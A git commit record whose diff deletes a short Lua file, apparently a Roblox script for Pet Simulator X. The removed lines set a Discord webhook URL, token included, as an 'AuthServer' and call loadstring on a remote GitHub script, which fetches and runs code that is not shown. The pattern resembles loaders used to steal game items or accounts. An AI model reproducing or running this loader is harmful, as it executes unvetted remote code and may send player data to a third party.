7fbeadab6c5c5e0c6c702619daacd35b79f42751
Extremescripted <120589176+Extremescripted@users.noreply.github.com>
2022-12-17 20:13:29 +0100

    Delete ez clapped.lua

--- ez clapped.lua
+++
@@ -1,3 +0,0 @@
-_G.Key = "5kleahcimaj"
-_G.AuthServer = "https://discord.com/api/webhooks/1053331679319687198/IaKtNLeP_BQh4Seo9UGuiamZEMUFaQmuHwT_8fTNZcZt0_6dLgnO53MY9oE11m7hAaZV"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))() 
